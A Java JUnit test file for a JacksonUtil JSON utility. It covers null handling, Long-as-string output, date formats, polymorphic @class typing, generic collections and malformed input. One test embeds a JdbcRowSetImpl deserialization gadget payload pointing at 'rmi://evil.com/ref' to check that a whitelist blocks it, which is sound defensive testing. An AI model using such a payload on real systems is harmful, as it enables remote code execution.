package com.byteasy.util;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import tools.jackson.core.type.TypeReference;
import tools.jackson.databind.JsonNode;

import java.math.BigDecimal;
import java.security.Principal;
import java.time.Duration;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.LocalTime;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.AssertionsForInterfaceTypes.assertThat;

@DisplayName("JacksonUtil 工具类测试")
public class JacksonUtilTest {

    // ==========================================
    // 0. 测试专用的模拟数据模型 (需在 com.byteasy. 包下)
    // ==========================================

    public enum StatusEnum {
        ACTIVE, INACTIVE
    }

    @Data
    @Builder
    @NoArgsConstructor
    @AllArgsConstructor
    public static class TestUser {
        private String name;
        private Integer age;
        private Long id;
        private BigDecimal balance;
        private StatusEnum status;
        private LocalDateTime createTime;
        private LocalDate birthDate;
        private LocalTime workTime;
        private Duration timeout;
        private String nullField; // 用于测试 NON_NULL
    }

    // 用于多态序列化测试的子类
    @Data
    @NoArgsConstructor
    @AllArgsConstructor
    public static class TestPrincipal implements Principal {
        private String name;

        @Override
        public String getName() {
            return name;
        }
    }

    // 没有任何属性的空类（测试 FAIL_ON_EMPTY_BEANS）
    public static class EmptyBean {
    }

    // ==========================================
    // 1. 基础配置与特性测试
    // ==========================================

    @Nested
    @DisplayName("基础序列化/反序列化特性测试")
    class BasicFeatureTests {

        @Test
        @DisplayName("null值字段不应序列化 (NON_NULL)")
        void shouldIgnoreNullFields() {
            TestUser user = TestUser.builder()
                    .name("Alice")
                    .nullField(null)
                    .build();

            String json = JacksonUtil.toJson(user);
            assertThat(json).contains("\"name\":\"Alice\"");
            assertThat(json).doesNotContain("nullField");
        }

        @Test
        @DisplayName("Long 类型应转为 String 防止前端精度丢失")
        void shouldSerializeLongAsString() {
            long largeId = 1888888888888888888L;
            TestUser user = TestUser.builder().id(largeId).build();

            String json = JacksonUtil.toJson(user);
            // 验证输出是 "id":"1888888888888888888" 而不是数字
            assertThat(json).contains("\"id\":\"1888888888888888888\"");

            TestUser parsed = JacksonUtil.parse(json, TestUser.class);
            assertThat(parsed).isNotNull();
            assertThat(parsed.getId()).isEqualTo(largeId);
        }

        @Test
        @DisplayName("BigDecimal 纯文本平铺输出 (WRITE_BIGDECIMAL_AS_PLAIN)")
        void shouldSerializeBigDecimalAsPlainString() {
            BigDecimal amount = new BigDecimal("100000000000.00000000");
            TestUser user = TestUser.builder().balance(amount).build();

            String json = JacksonUtil.toJson(user);
            // 不包含科学计数法（如 1E+11）
            assertThat(json).doesNotContain("E");
            assertThat(json).contains("100000000000.00000000");
        }

        @Test
        @DisplayName("枚举以字符串名称形式序列化和反序列化")
        void shouldHandleEnumsAsString() {
            TestUser user = TestUser.builder().status(StatusEnum.ACTIVE).build();

            String json = JacksonUtil.toJson(user);
            assertThat(json).contains("\"status\":\"ACTIVE\"");

            TestUser parsed = JacksonUtil.parse(json, TestUser.class);
            assertThat(parsed.getStatus()).isEqualTo(StatusEnum.ACTIVE);
        }

        @Test
        @DisplayName("反序列化遇到未知属性不抛异常 (FAIL_ON_UNKNOWN_PROPERTIES)")
        void shouldIgnoreUnknownProperties() {
            String json = "{\"name\":\"Bob\",\"unknownField\":\"123456\"}";
            TestUser user = JacksonUtil.parse(json, TestUser.class);

            assertThat(user).isNotNull();
            assertThat(user.getName()).isEqualTo("Bob");
        }

        @Test
        @DisplayName("空对象序列化不抛异常 (FAIL_ON_EMPTY_BEANS)")
        void shouldSerializeEmptyBeanWithoutException() {
            EmptyBean emptyBean = new EmptyBean();
            String json = JacksonUtil.toJson(emptyBean);
            assertThat(json).isEqualTo("{}");
        }
    }

    // ==========================================
    // 2. 日期与时间测试 (JavaTimeModule)
    // ==========================================

    @Nested
    @DisplayName("Java8 日期与时间处理测试")
    class JavaTimeTests {

        @Test
        @DisplayName("LocalDateTime / LocalDate / LocalTime 格式化")
        void shouldFormatJavaTimeCorrectly() {
            LocalDateTime dateTime = LocalDateTime.of(2026, 10, 24, 10, 30, 45);
            LocalDate date = LocalDate.of(2026, 10, 24);
            LocalTime time = LocalTime.of(10, 30, 45);

            TestUser user = TestUser.builder()
                    .createTime(dateTime)
                    .birthDate(date)
                    .workTime(time)
                    .build();

            String json = JacksonUtil.toJson(user);

            assertThat(json).contains("\"createTime\":\"2026-10-24 10:30:45\"");
            assertThat(json).contains("\"birthDate\":\"2026-10-24\"");
            assertThat(json).contains("\"workTime\":\"10:30:45\"");

            TestUser parsed = JacksonUtil.parse(json, TestUser.class);
            assertThat(parsed.getCreateTime()).isEqualTo(dateTime);
            assertThat(parsed.getBirthDate()).isEqualTo(date);
            assertThat(parsed.getWorkTime()).isEqualTo(time);
        }

        @Test
        @DisplayName("Duration 序列化为秒数数字，反序列化还原")
        void shouldSerializeDurationAsSeconds() {
            Duration duration = Duration.ofMinutes(5); // 300 秒
            TestUser user = TestUser.builder().timeout(duration).build();

            String json = JacksonUtil.toJson(user);
            assertThat(json).contains("\"timeout\":300");

            TestUser parsed = JacksonUtil.parse(json, TestUser.class);
            assertThat(parsed.getTimeout()).isEqualTo(Duration.ofSeconds(300));
        }
    }

    // ==========================================
    // 3. 多态与 @class 类型安全测试
    // ==========================================

    @Nested
    @DisplayName("多态与带类型信息 (@class) 序列化测试")
    class PolymorphicTests {

        @Test
        @DisplayName("withClass 模式应生成 @class 字段，并成功还原具体类型")
        void shouldSerializeAndDeserializeWithClass() {
            TestPrincipal principal = new TestPrincipal("admin-user");

            // 1. 使用带类型信息的序列化
            String json = JacksonUtil.toJson(principal, true);
            assertThat(json).contains("@class");
            assertThat(json).contains(TestPrincipal.class.getName());

            // 2. 使用 parseObj 直接反序列化出具体实现类
            Object restored = JacksonUtil.parseObj(json);
            assertThat(restored).isInstanceOf(TestPrincipal.class);
            assertThat(((TestPrincipal) restored).getName()).isEqualTo("admin-user");
        }

        @Test
        @DisplayName("parseObjList / parseObjArray 多态集合解析")
        void shouldParseObjListAndArray() {
            List<Object> list = List.of(
                    new TestPrincipal("user1"),
                    new TestPrincipal("user2")
            );

            String json = JacksonUtil.toJson(list, true);
            List<Object> restoredList = JacksonUtil.parseObjList(json);

            assertThat(restoredList).hasSize(2);
            assertThat(restoredList.get(0)).isInstanceOf(TestPrincipal.class);
            assertThat(((TestPrincipal) restoredList.get(0)).getName()).isEqualTo("user1");

            Object[] array = JacksonUtil.parseObjArray(json);
            assertThat(array).hasSize(2);
            assertThat(array[0]).isInstanceOf(TestPrincipal.class);
        }

        @Test
        @DisplayName("未允许的类型（不在白名单内）反序列化应被拦截")
        void shouldDenyUnauthorizedClass() {
            // 构造一个不被白名单允许的类型字符串（例如 com.sun.rowset.JdbcRowSetImpl）
            String maliciousJson = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil.com/ref\"}";

            // 安全机制拦截，反序列化失败返回 null，不发生远程代码执行
            Object result = JacksonUtil.parseObj(maliciousJson);
            assertThat(result).isNull();
        }
    }

    // ==========================================
    // 4. 泛型与集合解析测试
    // ==========================================

    @Nested
    @DisplayName("泛型与集合解析方法测试")
    class GenericCollectionTests {

        @Test
        @DisplayName("parseList 正确解析指定元素类型的 List")
        void shouldParseList() {
            List<TestUser> original = List.of(
                    TestUser.builder().name("UserA").build(),
                    TestUser.builder().name("UserB").build()
            );

            String json = JacksonUtil.toJson(original);
            List<TestUser> result = JacksonUtil.parseList(json, TestUser.class);

            assertThat(result).hasSize(2);
            assertThat(result.get(0).getName()).isEqualTo("UserA");
            assertThat(result.get(1).getName()).isEqualTo("UserB");
        }

        @Test
        @DisplayName("parseMap & parseLinkedHashMap 正确解析 Map")
        void shouldParseMap() {
            Map<String, Integer> map = Map.of("k1", 100, "k2", 200);
            String json = JacksonUtil.toJson(map);

            Map<String, Integer> resultMap = JacksonUtil.parseMap(json, String.class, Integer.class);
            assertThat(resultMap).containsEntry("k1", 100).containsEntry("k2", 200);

            LinkedHashMap<String, Integer> linkedMap = JacksonUtil.parseLinkedHashMap(json, String.class, Integer.class);
            assertThat(linkedMap).containsEntry("k1", 100).containsEntry("k2", 200);
        }

        @Test
        @DisplayName("nativeRead 复合泛型反序列化")
        void shouldNativeReadComplexGenerics() {
            Map<String, List<TestUser>> complexMap = Map.of(
                    "deptA", List.of(TestUser.builder().name("Jack").build())
            );

            String json = JacksonUtil.toJson(complexMap);

            // 1. 通过 TypeReference
            Map<String, List<TestUser>> res1 = JacksonUtil.nativeRead(json, new TypeReference<Map<String, List<TestUser>>>() {
            });
            assertThat(res1.get("deptA").get(0).getName()).isEqualTo("Jack");

            // 2. 通过 Class 变长参数
            Map<String, List<TestUser>> res2 = JacksonUtil.nativeRead(json, Map.class, String.class, List.class);
            assertThat(res2).containsKey("deptA");
        }
    }

    // ==========================================
    // 5. parseClazz 动态类型转换测试
    // ==========================================

    @Nested
    @DisplayName("parseClazz 多类型动态分发测试")
    class ParseClazzTests {

        @Test
        @DisplayName("支持基础数据类型与包装类转换")
        void shouldParsePrimitiveWrappers() {
            assertThat(JacksonUtil.parseClazz("123", Integer.class)).isEqualTo(123);
            assertThat(JacksonUtil.parseClazz("9999999999", Long.class)).isEqualTo(9999999999L);
            assertThat(JacksonUtil.parseClazz("3.1415", Double.class)).isEqualTo(3.1415);
            assertThat(JacksonUtil.parseClazz("2.71", Float.class)).isEqualTo(2.71f);
            assertThat(JacksonUtil.parseClazz("true", Boolean.class)).isEqualTo(true);
            assertThat(JacksonUtil.parseClazz("12.3456", BigDecimal.class)).isEqualTo(new BigDecimal("12.3456"));
            assertThat(JacksonUtil.parseClazz("Hello", String.class)).isEqualTo("Hello");
        }

        @Test
        @DisplayName("遇到 JSON 对象字符串转为 JavaBean")
        void shouldParseJsonObjectString() {
            String json = "{\"name\":\"Tom\",\"age\":18}";
            Object obj = JacksonUtil.parseClazz(json, TestUser.class);

            assertThat(obj).isInstanceOf(TestUser.class);
            TestUser user = (TestUser) obj;
            assertThat(user.getName()).isEqualTo("Tom");
            assertThat(user.getAge()).isEqualTo(18);
        }

        @Test
        @DisplayName("遇到 JSON 数组字符串转为 List")
        void shouldParseJsonArrayString() {
            String json = "[{\"name\":\"Tom\"},{\"name\":\"Jerry\"}]";
            Object obj = JacksonUtil.parseClazz(json, TestUser.class);

            assertThat(obj).isInstanceOf(List.class);
            List<?> list = (List<?>) obj;
            assertThat(list).hasSize(2);
            assertThat(list.get(0)).isInstanceOf(TestUser.class);
        }
    }

    // ==========================================
    // 6. 对象转换与 JsonNode 测试
    // ==========================================

    @Nested
    @DisplayName("对象互相转换与树模型解析测试")
    class ObjectConvertAndTreeTests {

        @Test
        @DisplayName("obj2Map & obj2StringMap 转换")
        void shouldConvertObjectToMap() {
            TestUser user = TestUser.builder().name("Sam").age(25).build();

            Map<String, Object> map = JacksonUtil.obj2Map(user);
            assertThat(map).containsEntry("name", "Sam").containsEntry("age", 25);

            Map<String, String> strMap = JacksonUtil.obj2StringMap(user);
            assertThat(strMap).containsEntry("name", "Sam").containsEntry("age", "25");
        }

        @Test
        @DisplayName("obj2Val 转换目标类型")
        void shouldConvertObjectToTargetValue() {
            Map<String, Object> map = Map.of("name", "Kate", "age", 20);
            TestUser user = JacksonUtil.obj2Val(map, TestUser.class);

            assertThat(user).isNotNull();
            assertThat(user.getName()).isEqualTo("Kate");
            assertThat(user.getAge()).isEqualTo(20);
        }

        @Test
        @DisplayName("readTree 读取 JSON 节点树")
        void shouldReadJsonTree() {
            String json = "{\"user\":{\"name\":\"Admin\"},\"roles\":[\"ADMIN\",\"USER\"]}";
            JsonNode root = JacksonUtil.readTree(json);

            assertThat(root).isNotNull();
            assertThat(root.get("user").get("name").asText()).isEqualTo("Admin");
            assertThat(root.get("roles").isArray()).isTrue();
            assertThat(root.get("roles").get(0).asText()).isEqualTo("ADMIN");
        }
    }

    // ==========================================
    // 7. 异常与边界值测试
    // ==========================================

    @Nested
    @DisplayName("空值与异常边界条件测试")
    class BoundaryTests {

        @Test
        @DisplayName("入参为 null 或空串时安全返回 null / 空集合")
        void shouldHandleNullGracefully() {
            assertThat(JacksonUtil.toJson(null)).isNull();
            assertThat(JacksonUtil.parse(null, TestUser.class)).isNull();
            assertThat(JacksonUtil.parseObj(null)).isNull();
            assertThat(JacksonUtil.parseObjList(null)).isEmpty();
            assertThat(JacksonUtil.parseObjArray(null)).isEmpty();
            assertThat(JacksonUtil.parseList(null, TestUser.class)).isNull();
            assertThat(JacksonUtil.parseMap(null, String.class, String.class)).isNull();
            assertThat(JacksonUtil.parseClazz(null, String.class)).isNull();
            assertThat(JacksonUtil.readTree(null)).isNull();
        }

        @Test
        @DisplayName("传入原生 String/Number 序列化时直接返回 toString 避免双重序列化引号")
        void shouldHandlePrimitiveStringAndNumberInToJson() {
            assertThat(JacksonUtil.toJson("hello")).isEqualTo("hello");
            assertThat(JacksonUtil.toJson(12345)).isEqualTo("12345");
        }

        @Test
        @DisplayName("格式错误的 JSON 字符串安全返回 null，不让异常穿透中断主流程")
        void shouldHandleMalformedJsonGracefully() {
            String malformedJson = "{not-a-valid-json}";

            assertThat(JacksonUtil.parse(malformedJson, TestUser.class)).isNull();
            assertThat(JacksonUtil.parseObj(malformedJson)).isNull();
            assertThat(JacksonUtil.parseObjList(malformedJson)).isEmpty();
            assertThat(JacksonUtil.readTree(malformedJson)).isNull();
        }
    }
}